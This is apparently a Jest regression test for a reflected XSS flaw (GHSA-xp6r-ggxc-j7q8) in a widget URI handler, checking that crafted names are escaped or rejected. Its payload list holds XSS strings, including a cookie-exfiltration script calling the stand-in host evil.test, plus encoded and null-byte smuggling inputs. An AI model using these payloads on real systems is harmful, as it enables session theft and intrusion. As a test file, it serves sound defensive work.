/**
 * A crafted `resources/read` URI cannot inject HTML into the placeholder widget
 * (GHSA-xp6r-ggxc-j7q8).
 *
 * `parseWidgetUri` matched `ui://widget/([^.]+)\.(\w+)$` — `[^.]+` accepts anything but a
 * dot, including tags, quotes and angle brackets. When no static widget is registered for
 * that name the handler falls through to `createDefaultBaseTemplate`, which interpolated the
 * name straight into `<code>${toolName}</code>`.
 *
 * So `resources/read` on `ui://widget/</code><script>alert(1)</script>.html` returned a
 * document containing the attacker's script, served as the widget for a tool that need not
 * even exist. Anything that renders the returned HTML executes it.
 */
import { handleUIResourceRead } from '../ui-resource.handler';
import { buildStaticWidgetUri, parseWidgetUri, type ToolUIRegistry } from '../ui-shared';

function createRegistry(): ToolUIRegistry {
  return {
    getStaticWidget: jest.fn(() => undefined),
    getResourceMeta: jest.fn(() => undefined),
  } as unknown as ToolUIRegistry;
}

const PAYLOADS = [
  '</code><script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg/onload=alert(1)>',
  "</code><script>fetch('//evil.test?c='+document.cookie)</script>",
];

describe('UI resource read — reflected XSS via the widget URI (GHSA-xp6r-ggxc-j7q8)', () => {
  it.each(PAYLOADS)('does not reflect %s into the widget HTML', (payload) => {
    const result = handleUIResourceRead(`ui://widget/${payload}.html`, createRegistry());

    const html = (result.result?.contents?.[0] as { text?: string } | undefined)?.text ?? '';

    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).not.toContain('onerror=alert(1)');
    expect(html).not.toContain('onload=alert(1)');
    expect(html).not.toContain('document.cookie');
    // The literal payload must never appear unescaped anywhere in the document.
    expect(html).not.toContain(payload);
  });

  it('rejects a widget URI whose name is not a plain tool name', () => {
    expect(parseWidgetUri('ui://widget/</code><script>alert(1)</script>.html')).toBeNull();
    expect(parseWidgetUri('ui://widget/<img src=x>.html')).toBeNull();
  });

  it('still parses ordinary tool names', () => {
    expect(parseWidgetUri('ui://widget/get_weather.html')).toEqual({
      toolName: 'get_weather',
      extension: 'html',
    });
    expect(parseWidgetUri('ui://widget/weather:get-forecast.html')).toEqual({
      toolName: 'weather:get-forecast',
      extension: 'html',
    });
  });

  it.each(['crm:lookup', 'github.create_issue', 'acme/billing-refunds', '@scope:tool_1'])(
    'reads back the URI buildStaticWidgetUri advertises for %s',
    (toolName) => {
      expect(parseWidgetUri(buildStaticWidgetUri(toolName))).toEqual({ toolName, extension: 'html' });
    },
  );

  it.each([
    'ui://widget/%3Cscript%3Ealert(1)%3C%2Fscript%3E.html',
    'ui://widget/%22%3E%3Csvg%2Fonload%3Dalert(1)%3E.html',
    'ui://widget/%253Cscript%253E.html',
    'ui://widget/%E0%A4%A.html',
    'ui://widget/tool%00.html',
  ])('rejects %s, whose decoded name is not a tool name', (uri) => {
    expect(parseWidgetUri(uri)).toBeNull();
  });

  it('still serves a placeholder for an ordinary tool name', () => {
    const result = handleUIResourceRead('ui://widget/get_weather.html', createRegistry());
    const html = (result.result?.contents?.[0] as { text?: string } | undefined)?.text ?? '';

    expect(result.handled).toBe(true);
    expect(html).toContain('get_weather');
  });
});
